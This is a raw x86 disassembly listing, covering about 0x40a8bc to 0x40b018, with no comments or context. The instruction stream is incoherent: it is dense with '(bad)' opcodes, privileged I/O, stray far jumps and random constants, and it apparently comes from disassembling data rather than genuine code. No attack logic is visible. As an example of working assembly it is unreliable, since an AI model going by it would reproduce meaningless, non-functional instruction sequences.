  40a8bc:	xchg   BYTE PTR [edx],al
  40a8be:	fldenv [ecx]
  40a8c0:	add    ecx,DWORD PTR [edx+0x32954432]
  40a8c6:	pop    edx
  40a8c7:	dec    ecx
  40a8c8:	js     0x40a8d4
  40a8ca:	repnz mov ebx,0x241414a9
  40a8d0:	xchg   edx,eax
  40a8d1:	lahf   
  40a8d2:	add    edi,DWORD PTR [edx-0x4e]
  40a8d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8d6:	xchg   esi,eax
  40a8d7:	adc    ebp,eax
  40a8d9:	sub    ebp,esi
  40a8db:	dec    esi
  40a8dc:	sbb    DWORD PTR [ecx-0x281c3395],edx
  40a8e2:	jmp    DWORD PTR [edi+0x23]
  40a8e5:	dec    BYTE PTR [edx*8-0x719cf042]
  40a8ec:	(bad)  
  40a8ed:	cmp    BYTE PTR [edi+0x6d],cl
  40a8f0:	sub    dh,BYTE PTR [ecx+0xc]
  40a8f3:	cmp    eax,0x5242a224
  40a8f8:	xchg   ebp,eax
  40a8f9:	nop
  40a8fa:	jg     0x40a8aa
  40a8fc:	es mov ebp,0x4f0dc72e
  40a902:	out    0xdb,al
  40a904:	push   ebx
  40a905:	(bad)  ds:0xb29675d7
  40a90b:	pop    edx
  40a90c:	xchg   esi,eax
  40a90d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a90e:	cmp    ch,cl
  40a910:	jp     0x40a932
  40a912:	sahf   
  40a913:	shl    BYTE PTR [ebx+0x6b],cl
  40a916:	add    al,0xf7
  40a918:	add    al,BYTE PTR [edx+0x391bd14d]
  40a91e:	mov    edi,0xc92f8ff0
  40a923:	jg     0x40a98f
  40a925:	and    BYTE PTR [esi+0x7a2748b1],cl
  40a92b:	lock fdivr DWORD PTR [eax+0x3d5bd627]
  40a932:	xor    al,0x23
  40a934:	or     eax,0x72aff2e0
  40a939:	pop    ebx
  40a93a:	(bad)  
  40a93b:	fcomi  st,st(7)
  40a93d:	jno    0x40a97e
  40a93f:	inc    edi
  40a940:	sub    BYTE PTR [ebx-0x5b],ch
  40a943:	jbe    0x40a911
  40a945:	psrld  mm5,mm0
  40a948:	dec    ecx
  40a949:	ret    0xb18a
  40a94c:	jmp    0x25db:0xdb9d0a14
  40a953:	sbb    esi,DWORD PTR [edx]
  40a955:	mov    BYTE PTR [edx],bh
  40a957:	push   es
  40a958:	push   edx
  40a959:	not    BYTE PTR [edx-0x4b]
  40a95c:	addr16 (bad) 
  40a95f:	pusha  
  40a960:	ja     0x40a90a
  40a962:	js     0x40a8f6
  40a964:	das    
  40a965:	jg     0x40a911
  40a967:	pop    eax
  40a968:	pop    ebp
  40a969:	cmp    ch,BYTE PTR [edx+0x277e7131]
  40a96f:	out    dx,al
  40a970:	cmp    edi,DWORD PTR [ecx+ebx*2+0x3e32a64f]
  40a977:	xchg   DWORD PTR [edx+0x7902ce6c],ebx
  40a97d:	jnp    0x40a958
  40a97f:	or     al,0xdb
  40a982:	out    0x4e,eax
  40a984:	popw   es
  40a986:	pop    ss
  40a987:	pop    esp
  40a988:	aad    0xde
  40a98a:	repnz xchg ebx,eax
  40a98c:	mov    ds:0x5f8bb915,eax
  40a991:	popa   
  40a992:	mov    dl,0x4
  40a994:	adc    ch,BYTE PTR ds:0xb94406e9
  40a99a:	mov    eax,ds:0x1b7346f7
  40a99f:	mov    ebx,DWORD PTR ds:0x86d8
  40a9a4:	daa    
  40a9a5:	inc    esi
  40a9a6:	push   ds
  40a9a7:	in     al,dx
  40a9a8:	mov    esp,0xf6e9f389
  40a9ad:	aas    
  40a9ae:	and    ebx,DWORD PTR [esi+esi*8-0x6ea090f5]
  40a9b5:	test   BYTE PTR ds:0xc89b8084,0x6
  40a9bc:	scas   al,BYTE PTR es:[edi]
  40a9bd:	(bad)  
  40a9be:	into   
  40a9bf:	dec    esi
  40a9c0:	test   DWORD PTR [edi-0x75b4ef83],edi
  40a9c6:	adc    ebp,DWORD PTR [edi+0x24]
  40a9c9:	in     eax,0x49
  40a9cb:	add    ecx,esi
  40a9cd:	or     BYTE PTR [eax],cl
  40a9cf:	lock fimul DWORD PTR ds:0x5636d968
  40a9d6:	mov    esp,0x596a08aa
  40a9db:	and    DWORD PTR [esi+ecx*1-0xb53bdd2],eax
  40a9e2:	js     0x40aa31
  40a9e4:	sbb    BYTE PTR [ebx-0x24484cd9],bl
  40a9ea:	icebp  
  40a9eb:	inc    ecx
  40a9ec:	in     al,0x39
  40a9ee:	inc    eax
  40a9ef:	sub    DWORD PTR [edx],ebx
  40a9f1:	or     eax,0x428051b7
  40a9f6:	mov    bl,0x67
  40a9f8:	sbb    eax,0xd980dab5
  40a9fd:	mov    ah,0x83
  40a9ff:	inc    esp
  40aa00:	repz sar BYTE PTR [esi],0x8c
  40aa04:	add    DWORD PTR [ecx],edi
  40aa06:	cmp    dh,BYTE PTR [ebp+0x10]
  40aa09:	adc    ecx,edi
  40aa0b:	les    esp,FWORD PTR [edx]
  40aa0d:	xchg   edi,eax
  40aa0e:	xchg   ebx,eax
  40aa0f:	mov    edx,edi
  40aa11:	shl    DWORD PTR [ecx],1
  40aa13:	and    al,0xc0
  40aa15:	xchg   ebx,eax
  40aa16:	mov    ebp,0xa03afd31
  40aa1b:	adc    ah,BYTE PTR [eax-0x4a4db903]
  40aa21:	shl    edi,1
  40aa23:	aas    
  40aa24:	mov    ebp,DWORD PTR ds:0x53b2b24e
  40aa2a:	nop
  40aa2b:	outs   dx,BYTE PTR ds:[esi]
  40aa2c:	nop    DWORD PTR [edx]
  40aa2f:	jmp    0x40a9bf
  40aa31:	mov    ebx,0xf70e9246
  40aa36:	push   edi
  40aa37:	data16 (bad) 
  40aa39:	push   ss
  40aa3a:	or     ah,BYTE PTR [edi-0x69]
  40aa3d:	fist   WORD PTR ds:0xaae498b5
  40aa43:	test   eax,0x71a8e614
  40aa48:	xchg   edi,eax
  40aa49:	mov    fs,WORD PTR ds:[ecx+0x14]
  40aa4d:	adc    edi,DWORD PTR [ecx*8-0x3d5f04d8]
  40aa54:	pop    es
  40aa55:	xchg   DWORD PTR [esp+eax*1+0x3babebb2],edx
  40aa5c:	or     eax,0x9f56c387
  40aa61:	shr    BYTE PTR [esi-0x786ce74a],cl
  40aa67:	mov    ecx,0xf6ece9e2
  40aa6c:	or     BYTE PTR [edx],bh
  40aa6e:	and    eax,0x2daa05ea
  40aa73:	cmp    al,0x51
  40aa75:	xor    BYTE PTR [esi-0xfb21a59],dl
  40aa7b:	mov    dh,BYTE PTR [ebx+0x5bc9687c]
  40aa81:	inc    ebp
  40aa82:	pop    ebx
  40aa83:	dec    edx
  40aa84:	sbb    dl,bl
  40aa86:	sbb    esi,ecx
  40aa88:	mov    ecx,0x2a6fba1
  40aa8d:	idiv   DWORD PTR [eax-0x5f]
  40aa90:	and    ebx,edx
  40aa92:	sbb    eax,0x317d7311
  40aa97:	in     eax,0x4
  40aa99:	int    0x48
  40aa9b:	push   ebx
  40aa9c:	inc    ebp
  40aa9d:	fsubp  st(3),st
  40aa9f:	or     DWORD PTR [esi-0x29],eax
  40aaa2:	and    cl,bh
  40aaa4:	retf   0xb20b
  40aaa7:	shl    BYTE PTR [eax],1
  40aaa9:	hlt    
  40aaaa:	xor    BYTE PTR [ecx],dh
  40aaac:	pushf  
  40aaad:	stos   DWORD PTR es:[edi],eax
  40aaae:	jnp    0x40ab11
  40aab0:	pop    esi
  40aab1:	cmp    al,0x59
  40aab3:	int    0x69
  40aab5:	dec    ecx
  40aab6:	sub    DWORD PTR [ecx+ebp*8-0x49],ebp
  40aaba:	adc    dl,ch
  40aabc:	cli    
  40aabd:	leave  
  40aabe:	les    edx,FWORD PTR [edx]
  40aac0:	jmp    0x130c0e3e
  40aac5:	xor    BYTE PTR [ecx+0x30],ch
  40aac8:	fcomp  QWORD PTR [edx+0x21]
  40aacb:	clc    
  40aacc:	pushf  
  40aacd:	iret   
  40aace:	out    0x6f,eax
  40aad0:	push   ebx
  40aad1:	jno    0x40ab13
  40aad3:	xor    ecx,DWORD PTR [edx+0x73bddf6c]
  40aad9:	bound  ecx,QWORD PTR [eax-0x5e686cad]
  40aadf:	add    eax,0x2f2eeafd
  40aae4:	jnp    0x40aa95
  40aae6:	xor    eax,0xd4cd3c0f
  40aaeb:	xor    eax,0xbac9de6
  40aaf0:	lods   eax,DWORD PTR ds:[esi]
  40aaf1:	jo     0x40ab54
  40aaf3:	shr    DWORD PTR [ebx-0x33],0xbd
  40aaf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaf8:	pop    eax
  40aaf9:	inc    ebp
  40aafa:	mov    al,ds:0xdd86b16e
  40aaff:	lahf   
  40ab00:	sub    esi,DWORD PTR [edi-0xc853f8]
  40ab06:	out    dx,al
  40ab07:	frstor [esi-0x55]
  40ab0a:	aam    0xf0
  40ab0c:	adc    ecx,edi
  40ab0e:	cmp    eax,0xf6da0f6f
  40ab13:	sbb    edi,DWORD PTR [ebx-0x1ecd681d]
  40ab19:	pusha  
  40ab1a:	retf   
  40ab1b:	adc    al,0x4d
  40ab1d:	jge    0x40aad0
  40ab1f:	add    eax,0xfa51938b
  40ab24:	add    al,0xae
  40ab26:	std    
  40ab27:	cs mov bh,0x31
  40ab2a:	popf   
  40ab2b:	xor    eax,0x90534db7
  40ab30:	inc    ecx
  40ab31:	fnsave [edi-0x2c]
  40ab34:	ds ror dl,1
  40ab37:	(bad)  
  40ab38:	call   0xa0ce80b4
  40ab3d:	sbb    DWORD PTR [ebp-0x5d352807],eax
  40ab43:	push   es
  40ab44:	arpl   WORD PTR [esi],bp
  40ab46:	and    ch,BYTE PTR [ebx+ebp*2-0xa]
  40ab4a:	push   cs
  40ab4b:	ss pop eax
  40ab4d:	push   0x18
  40ab4f:	jl     0x40aae8
  40ab51:	pusha  
  40ab52:	and    al,0x8a
  40ab54:	mov    bl,0x6c
  40ab56:	pop    ecx
  40ab57:	loop   0x40abb4
  40ab59:	dec    esp
  40ab5a:	(bad)  
  40ab5b:	lods   al,BYTE PTR ds:[esi]
  40ab5c:	sar    edx,1
  40ab5e:	sbb    eax,DWORD PTR [eax+0x53]
  40ab61:	es out 0xa4,eax
  40ab64:	push   eax
  40ab65:	arpl   WORD PTR [esi+esi*4],dx
  40ab68:	test   DWORD PTR [edi],edx
  40ab6a:	leave  
  40ab6b:	jg     0x40abca
  40ab6d:	lock xchg bx,ax
  40ab70:	mov    dh,0x91
  40ab72:	sub    eax,0xada9343f
  40ab77:	pop    esp
  40ab78:	add    esi,edx
  40ab7a:	inc    ebp
  40ab7b:	mov    ecx,0xf740e9bb
  40ab80:	fs leave 
  40ab82:	jno    0x40abbc
  40ab84:	cmp    BYTE PTR [edi-0x6d3d7455],cl
  40ab8a:	sub    al,0xbb
  40ab8c:	int    0x46
  40ab8e:	pop    ecx
  40ab8f:	pop    es
  40ab90:	gs mov cl,0x9e
  40ab93:	int3   
  40ab94:	in     eax,0x51
  40ab96:	repnz fild WORD PTR [edi]
  40ab99:	adc    BYTE PTR [ecx-0x36],bl
  40ab9c:	xsaves [eax+0x74]
  40aba0:	fwait
  40aba1:	inc    eax
  40aba2:	mov    dl,0x80
  40aba4:	jle    0x40aba9
  40aba6:	retf   0x7d43
  40aba9:	and    al,0xa0
  40abab:	inc    edi
  40abac:	sub    al,0x62
  40abae:	cli    
  40abaf:	xor    esp,0xfb27d0ec
  40abb5:	ins    DWORD PTR es:[edi],dx
  40abb6:	mov    ch,0x6d
  40abb8:	or     dl,BYTE PTR [edi]
  40abba:	aad    0xe6
  40abbc:	push   cs
  40abbd:	push   ebp
  40abbe:	jns    0x40ab53
  40abc0:	js     0x40ac2c
  40abc2:	adc    DWORD PTR [esi-0x6b9d78c8],edi
  40abc8:	and    al,0x52
  40abca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abcb:	ret    
  40abcc:	jge    0x40ac25
  40abce:	stos   BYTE PTR es:[edi],al
  40abcf:	and    edx,DWORD PTR [eax+0xd2f2bb]
  40abd5:	dec    eax
  40abd6:	sub    al,0x6a
  40abd8:	in     eax,dx
  40abd9:	lods   al,BYTE PTR ds:[esi]
  40abda:	dec    ebp
  40abdb:	ss jle 0x40ac35
  40abde:	fwait
  40abdf:	jecxz  0x40abe1
  40abe1:	cmp    al,0x63
  40abe3:	add    dl,BYTE PTR ds:0x23c7f99
  40abe9:	in     al,dx
  40abea:	je     0x40abce
  40abec:	add    eax,0xb5d7f761
  40abf1:	test   eax,0x51645d54
  40abf6:	int3   
  40abf7:	cwde   
  40abf8:	mov    esi,0x4dc4b1b2
  40abfd:	pop    esp
  40abfe:	mov    dh,0x33
  40ac00:	retf   
  40ac01:	mov    al,ds:0x669e5906
  40ac06:	in     eax,0xd
  40ac08:	ins    DWORD PTR es:[edi],dx
  40ac09:	dec    ebp
  40ac0a:	dec    ebp
  40ac0b:	scas   al,BYTE PTR es:[edi]
  40ac0c:	sbb    DWORD PTR [eax],esi
  40ac0e:	inc    ebx
  40ac0f:	fisubr WORD PTR [ecx-0x7c076041]
  40ac15:	nop
  40ac16:	jmp    0xca28:0xfcf6fe8c
  40ac1d:	push   ds
  40ac1e:	loope  0x40ac87
  40ac20:	stos   BYTE PTR es:[edi],al
  40ac21:	sbb    dl,bh
  40ac23:	psllw  mm1,QWORD PTR [esp+edx*4]
  40ac27:	xchg   BYTE PTR [ebx-0x4fde0f24],cl
  40ac2d:	rol    BYTE PTR [edi-0x3d70eeff],1
  40ac33:	retf   
  40ac34:	mov    esi,DWORD PTR [edx-0x70]
  40ac37:	retf   0x8de0
  40ac3a:	cmp    ebp,ebx
  40ac3c:	leave  
  40ac3d:	test   DWORD PTR [ebx],ecx
  40ac3f:	arpl   sp,bx
  40ac41:	push   cs
  40ac42:	pushf  
  40ac43:	cs mov eax,0x65a99759
  40ac49:	mov    esp,DWORD PTR [ebp+0x422e6d24]
  40ac4f:	inc    ecx
  40ac50:	push   eax
  40ac51:	and    edx,DWORD PTR [ebx-0x6b548f0]
  40ac57:	jmp    0x8809:0x85768d64
  40ac5e:	and    bh,cl
  40ac60:	jl     0x40ac60
  40ac62:	jno    0x40ac34
  40ac64:	xor    edi,DWORD PTR [ebx]
  40ac66:	mov    dh,0x28
  40ac68:	push   ebx
  40ac69:	xchg   DWORD PTR [edi-0x30],ebx
  40ac6c:	arpl   WORD PTR [esi-0x4b],bp
  40ac6f:	jle    0x40acf0
  40ac71:	mov    edx,0x136cd3fb
  40ac76:	push   edx
  40ac77:	adc    BYTE PTR [edx-0x4b],al
  40ac7a:	stos   BYTE PTR es:[edi],al
  40ac7b:	cmc    
  40ac7c:	jae    0x40ac42
  40ac7e:	test   eax,0x1fb01b3
  40ac83:	test   eax,0x47b1470e
  40ac88:	inc    ecx
  40ac89:	pop    ds
  40ac8a:	push   0xffffff84
  40ac8c:	pop    ds
  40ac8d:	push   esp
  40ac8f:	test   BYTE PTR [ecx+0x4a],dh
  40ac92:	push   eax
  40ac93:	mov    WORD PTR [ebp-0x74],gs
  40ac96:	(bad)  [edx-0x72]
  40ac99:	test   eax,0x8acd49b9
  40ac9e:	mov    ds:0x68ae4333,eax
  40aca3:	mov    WORD PTR ds:0xea350bd1,?
  40aca9:	cmp    DWORD PTR [eax+0x63],ebx
  40acac:	(bad)  
  40acad:	push   esi
  40acae:	or     DWORD PTR [edx-0x29079d4a],ebx
  40acb4:	cwde   
  40acb5:	cmp    BYTE PTR fs:[ecx+ecx*8-0x5d366c14],ah
  40acbd:	xchg   edi,eax
  40acbe:	ins    DWORD PTR es:[edi],dx
  40acbf:	test   al,0x6c
  40acc1:	fisttp QWORD PTR [edx-0x2]
  40acc4:	mov    ah,0xfe
  40acc6:	push   ss
  40acc7:	push   es
  40acc8:	push   edi
  40acc9:	mov    DWORD PTR [ebx],edx
  40accb:	mov    ds:0xf9187090,eax
  40acd0:	iret   
  40acd1:	pop    edx
  40acd2:	inc    eax
  40acd3:	call   0xa0389e46
  40acd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acd9:	shl    DWORD PTR [eax+0xb],1
  40acdc:	clc    
  40acdd:	cmc    
  40acde:	in     eax,dx
  40acdf:	aas    
  40ace0:	mov    ecx,0x3f0a6c6e
  40ace5:	aam    0x47
  40ace7:	ds aam 0x1b
  40acea:	lods   eax,DWORD PTR ds:[esi]
  40aceb:	daa    
  40acec:	xor    esp,DWORD PTR [ebp-0x2a]
  40acef:	cdq    
  40acf0:	and    DWORD PTR [ebx-0x5d],0xfc497a1c
  40acf7:	xchg   DWORD PTR [edx+ebp*8],ebp
  40acfa:	popa   
  40acfb:	adc    ecx,edi
  40acfd:	test   DWORD PTR [esi-0x60],esi
  40ad00:	lds    edx,FWORD PTR [eax]
  40ad02:	out    0xc8,eax
  40ad04:	push   cs
  40ad05:	aaa    
  40ad06:	(bad)  [edi]
  40ad08:	or     edi,DWORD PTR [ecx+0x76]
  40ad0b:	dec    ebp
  40ad0c:	ror    DWORD PTR [edi-0x52f43535],cl
  40ad12:	sar    BYTE PTR [esi],0x14
  40ad15:	pop    eax
  40ad16:	inc    esp
  40ad18:	std    
  40ad19:	sub    dh,dh
  40ad1b:	clc    
  40ad1c:	xor    BYTE PTR [ebp+edx*8-0x426857d0],bl
  40ad23:	retf   
  40ad24:	gs mov esp,0xc3c333b0
  40ad2a:	cld    
  40ad2b:	cmp    ebp,edi
  40ad2d:	ss ret 0xbcdd
  40ad31:	loope  0x40acd2
  40ad33:	nop
  40ad34:	jnp    0x40ad2d
  40ad36:	cmc    
  40ad37:	mov    esp,0x4de637de
  40ad3c:	fld    QWORD PTR [ebx+0x5c]
  40ad3f:	mov    cl,0xf1
  40ad41:	push   ds
  40ad42:	enter  0x2112,0x47
  40ad46:	cmp    eax,0xd87613ab
  40ad4b:	cmp    al,0x8a
  40ad4d:	mov    edi,0x2699a910
  40ad52:	dec    esp
  40ad53:	dec    esi
  40ad54:	out    dx,al
  40ad55:	pop    eax
  40ad56:	sub    ax,0x7731
  40ad5a:	jg     0x40adc3
  40ad5c:	sbb    ecx,DWORD PTR [eax+0x6d]
  40ad5f:	adc    DWORD PTR ss:[edx],edi
  40ad62:	push   ebp
  40ad63:	sub    bl,BYTE PTR [ebx]
  40ad65:	ss jmp 0x40ad25
  40ad68:	pop    esi
  40ad69:	mov    esi,0x57e001b9
  40ad6e:	sbb    al,0x46
  40ad70:	xchg   edi,eax
  40ad71:	stc    
  40ad72:	sub    DWORD PTR [edi],edx
  40ad74:	sub    BYTE PTR [eax-0x6],ch
  40ad77:	push   edi
  40ad78:	inc    esi
  40ad79:	xor    dl,BYTE PTR [edx-0x19a50776]
  40ad7f:	or     dh,0x4a
  40ad82:	div    BYTE PTR [esi]
  40ad84:	mov    eax,ds:0xd44f7a57
  40ad89:	mov    edi,DWORD PTR [edx-0x60]
  40ad8c:	mov    ebx,edx
  40ad8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad8f:	sbb    al,0xf0
  40ad91:	pop    edx
  40ad92:	jge    0x40ad30
  40ad94:	pop    edx
  40ad95:	xchg   BYTE PTR [edx+ebx*1-0xb67b9c0],bh
  40ad9c:	imul   esp,DWORD PTR [ebx+0x72],0xffffffe7
  40ada0:	inc    esi
  40ada1:	lahf   
  40ada2:	loopne 0x40ae19
  40ada4:	inc    ebx
  40ada5:	(bad)  [edx]
  40ada7:	or     al,0x4b
  40ada9:	jge    0x40adda
  40adab:	mov    dl,0xc9
  40adad:	jns    0x40adaf
  40adaf:	(bad)  
  40adb0:	loop   0x40ae10
  40adb2:	dec    ecx
  40adb3:	push   0x128dd5c0
  40adb8:	cwde   
  40adb9:	sbb    al,0x6e
  40adbb:	dec    edi
  40adbc:	xor    dh,BYTE PTR [ebx]
  40adbe:	loopne 0x40ad48
  40adc0:	xor    eax,0x62cadedf
  40adc5:	mov    bh,BYTE PTR [edx-0x5d]
  40adc8:	mov    DWORD PTR [edx],ebp
  40adca:	add    al,0x43
  40adcc:	mov    dh,0x8c
  40adce:	sahf   
  40adcf:	and    bh,BYTE PTR [edi+eiz*2-0x3879c3e4]
  40add6:	jo     0x40ad77
  40add8:	mov    ah,0xa8
  40adda:	or     al,0x28
  40addc:	xchg   ecx,eax
  40addd:	ins    DWORD PTR es:[edi],dx
  40adde:	retf   0x1a00
  40ade1:	popf   
  40ade2:	imul   esp,DWORD PTR [eax+ebx*4],0x405d4eb2
  40ade9:	xchg   ebp,eax
  40adea:	dec    esi
  40adeb:	adc    BYTE PTR [eax+0x27],al
  40adee:	call   0xe1d85b
  40adf3:	add    DWORD PTR [edi],edx
  40adf5:	inc    ebx
  40adf6:	jae    0x40adc4
  40adf8:	pop    esi
  40adf9:	sub    DWORD PTR [ebx],0xffffff82
  40adfc:	xchg   edx,eax
  40adfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adfe:	lods   eax,DWORD PTR ds:[esi]
  40adff:	pop    esi
  40ae00:	imul   ch
  40ae02:	sub    BYTE PTR [edi],dh
  40ae04:	xchg   ecx,eax
  40ae05:	mov    DWORD PTR [edi+0x59c2b816],ebx
  40ae0b:	stos   DWORD PTR es:[edi],eax
  40ae0c:	jae    0x40ae63
  40ae0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae0f:	icebp  
  40ae10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae11:	loop   0x40ae7e
  40ae13:	lea    ecx,[ebx]
  40ae15:	mov    ch,bh
  40ae17:	out    dx,al
  40ae18:	push   0x6b
  40ae1a:	mov    eax,ds:0x646173a9
  40ae1f:	and    al,0x3d
  40ae21:	sub    al,0xe2
  40ae23:	(bad)  
  40ae24:	cli    
  40ae25:	fisttp QWORD PTR [ebp+0x6e]
  40ae28:	inc    ebx
  40ae29:	lods   eax,DWORD PTR ds:[esi]
  40ae2a:	shl    BYTE PTR [edx],cl
  40ae2c:	ins    BYTE PTR es:[edi],dx
  40ae2d:	dec    edi
  40ae2e:	fs xchg esi,eax
  40ae30:	push   ecx
  40ae31:	cmp    DWORD PTR ds:0x1f1172f3,edx
  40ae37:	xor    al,0x56
  40ae39:	inc    ebp
  40ae3a:	dec    ebp
  40ae3b:	or     eax,0x8b95ae40
  40ae40:	cs jne 0x40ade1
  40ae43:	or     DWORD PTR [eax-0x56c8d5f3],esp
  40ae49:	xor    ebx,DWORD PTR [edi+0x68]
  40ae4c:	les    eax,FWORD PTR [ebx]
  40ae4e:	xor    esp,DWORD PTR [edx]
  40ae50:	and    BYTE PTR [esi+0x766e3382],al
  40ae56:	ss cmp al,0x47
  40ae59:	and    esi,DWORD PTR [edx]
  40ae5b:	sbb    ebp,DWORD PTR [ecx+edi*1]
  40ae5e:	int    0x6d
  40ae60:	inc    ebx
  40ae61:	pusha  
  40ae62:	mov    dh,0x6
  40ae64:	ins    BYTE PTR es:[edi],dx
  40ae65:	or     BYTE PTR [ebx],ch
  40ae67:	dec    esi
  40ae68:	add    dh,BYTE PTR [eax+ebp*2+0x78]
  40ae6c:	call   0x1a4f8fef
  40ae71:	dec    edi
  40ae72:	push   eax
  40ae73:	push   ebx
  40ae74:	jl     0x40ae43
  40ae76:	les    ebx,FWORD PTR [edx+0x0]
  40ae79:	sub    ah,BYTE PTR [esp+ebx*4]
  40ae7c:	pop    eax
  40ae7d:	fidiv  DWORD PTR [ecx]
  40ae7f:	aam    0xc6
  40ae81:	push   es
  40ae82:	inc    edx
  40ae83:	or     eax,0x5d2de49a
  40ae88:	push   es
  40ae89:	imul   ecx,DWORD PTR [esi+0x11],0xffffff98
  40ae8d:	aas    
  40ae8e:	mov    esp,DWORD PTR [esi+0x10]
  40ae91:	push   0xeda7c07c
  40ae96:	repnz repz fdivr DWORD PTR [ecx+0x64]
  40ae9b:	aam    0x8a
  40ae9d:	dec    edi
  40ae9e:	rcr    ebx,cl
  40aea0:	pop    eax
  40aea1:	sar    al,1
  40aea3:	ret    
  40aea4:	dec    ebx
  40aea5:	jge    0x40aec7
  40aea7:	pop    esp
  40aea8:	jnp    0x40ae30
  40aeaa:	lods   eax,DWORD PTR ds:[esi]
  40aeab:	adc    esi,ebx
  40aead:	repnz shr BYTE PTR [ebx-0x397c403e],0x62
  40aeb5:	cmc    
  40aeb6:	and    ebp,0x12
  40aeb9:	ins    BYTE PTR es:[edi],dx
  40aeba:	inc    ecx
  40aebb:	sti    
  40aebc:	(bad)  
  40aebd:	outs   dx,DWORD PTR ds:[esi]
  40aebe:	jbe    0x40af35
  40aec0:	adc    BYTE PTR [eax-0x26],cl
  40aec3:	push   ebx
  40aec4:	cmc    
  40aec5:	sbb    ebp,DWORD PTR [edi]
  40aec7:	xchg   BYTE PTR [edi-0x3b],dh
  40aeca:	jnp    0x40aeeb
  40aecc:	pusha  
  40aecd:	jle    0x40ae7f
  40aecf:	inc    ecx
  40aed0:	mov    edi,0x3c9af16c
  40aed5:	test   ch,dh
  40aed7:	dec    esi
  40aed8:	dec    esi
  40aed9:	addr16 int3 
  40aedb:	add    eax,0x41a74856
  40aee0:	push   ebx
  40aee1:	in     eax,0x66
  40aee3:	shl    edx,0x40
  40aee6:	jge    0x40af06
  40aee8:	mov    esp,?
  40aeea:	aas    
  40aeeb:	gs mov ecx,0x6cdf4265
  40aef1:	push   ds
  40aef2:	ss sahf 
  40aef4:	sti    
  40aef5:	call   0xa6ef:0xa777d91d
  40aefc:	cmp    sp,WORD PTR [ebp-0x114995f8]
  40af03:	test   BYTE PTR [ebp-0x48058bb9],0x61
  40af0a:	dec    ecx
  40af0b:	leave  
  40af0c:	sub    BYTE PTR [ebp+eiz*4-0x44],al
  40af10:	cwde   
  40af11:	retf   
  40af12:	push   edi
  40af13:	nop
  40af14:	xor    BYTE PTR [ecx+0x7f],ch
  40af17:	sub    eax,0xc53b0158
  40af1c:	pop    ds
  40af1d:	das    
  40af1e:	stc    
  40af1f:	jns    0x40aec9
  40af21:	jge    0x40aecc
  40af23:	int    0x50
  40af25:	ins    DWORD PTR es:[edi],dx
  40af26:	jae    0x40af07
  40af28:	sub    BYTE PTR [ebx+ebx*1-0x10f72d9a],ch
  40af2f:	nop
  40af30:	aad    0x46
  40af32:	(bad)  
  40af33:	mov    edi,0x11bc9c7f
  40af38:	scas   al,BYTE PTR es:[edi]
  40af39:	ret    0x218
  40af3c:	sbb    DWORD PTR [eax+0x6e2432bf],ecx
  40af42:	push   edi
  40af43:	in     al,dx
  40af44:	in     eax,0xf3
  40af46:	ins    DWORD PTR es:[edi],dx
  40af47:	popf   
  40af48:	rcl    DWORD PTR [esi-0x6],cl
  40af4b:	fucomi st,st(3)
  40af4d:	mov    cl,0x66
  40af4f:	inc    eax
  40af50:	stc    
  40af51:	je     0x40af64
  40af53:	jae    0x40af9a
  40af55:	test   al,0x15
  40af57:	push   edx
  40af58:	jmp    0x351c:0x1328a9f8
  40af5f:	stos   BYTE PTR es:[edi],al
  40af60:	add    eax,0x1229a3b1
  40af65:	mov    ds:0xe7cc770e,al
  40af6a:	(bad)  
  40af6b:	adc    ebx,ebx
  40af6d:	in     eax,dx
  40af6e:	sbb    DWORD PTR ds:0x9f894849,edi
  40af74:	jnp    0x40af80
  40af76:	or     ebx,ebp
  40af78:	or     DWORD PTR [esi+0x5f],edi
  40af7b:	mov    ebp,ebx
  40af7d:	out    dx,eax
  40af7e:	xchg   esp,eax
  40af7f:	icebp  
  40af80:	or     al,0xd6
  40af82:	or     esp,ebp
  40af84:	push   eax
  40af85:	fwait
  40af86:	retf   0x61ed
  40af89:	call   0x57fb5b88
  40af8e:	mov    cl,0x50
  40af90:	adc    al,0xa8
  40af92:	scas   al,BYTE PTR es:[edi]
  40af93:	sub    BYTE PTR [ebx+0x59],0xa2
  40af97:	repz pop ecx
  40af99:	jg     0x40af65
  40af9b:	repnz aad 0x9
  40af9e:	in     al,0xf
  40afa0:	dec    ecx
  40afa1:	pop    ebx
  40afa2:	mov    BYTE PTR [esi-0x3ab2b68a],bh
  40afa8:	lock xchg ecx,eax
  40afaa:	mov    ch,0xe1
  40afac:	popfw  
  40afae:	pop    edx
  40afaf:	pop    esp
  40afb0:	cmp    ah,BYTE PTR es:[esi+0x5374bb76]
  40afb7:	fcom   DWORD PTR [esi+0x6e868680]
  40afbd:	ss pop ecx
  40afbf:	es xor ebp,ebx
  40afc2:	aam    0x8f
  40afc4:	rcl    BYTE PTR [ebp-0x6e58372f],0x1a
  40afcb:	xor    eax,0x544bc2f5
  40afd0:	or     esi,ebx
  40afd2:	repz bnd js 0x40afe8
  40afd6:	dec    edi
  40afd7:	xor    ah,BYTE PTR [ecx]
  40afd9:	imul   esi,DWORD PTR [ecx+0x5a],0x1e
  40afdd:	out    dx,eax
  40afde:	mov    BYTE PTR [ebx-0x29bcb74d],0xa7
  40afe5:	out    0xbb,eax
  40afe7:	push   es
  40afe8:	cmp    dl,BYTE PTR [edx-0x74]
  40afeb:	inc    ecx
  40afec:	das    
  40afed:	jno    0x40b069
  40afef:	icebp  
  40aff0:	(bad)  
  40aff1:	sbb    edx,ebx
  40aff3:	mov    ch,BYTE PTR [esi+0x12]
  40aff6:	mov    cl,dh
  40aff8:	test   DWORD PTR [ebx],0x6a48e9fe
  40affe:	clc    
  40afff:	push   esp
  40b000:	dec    eax
  40b001:	jle    0x40af9a
  40b003:	xor    DWORD PTR [esi+0x5b],esp
  40b006:	icebp  
  40b007:	and    ch,BYTE PTR [ebp+0x6d]
  40b00a:	js     0x40b006
  40b00c:	adc    al,0x9a
  40b00e:	retf   0x75da
  40b011:	sub    al,0xd7
  40b013:	cli    
  40b014:	fadd   QWORD PTR [ecx-0x7d]
  40b017:	dec    edx
  40b018:	xchg   ebp,eax
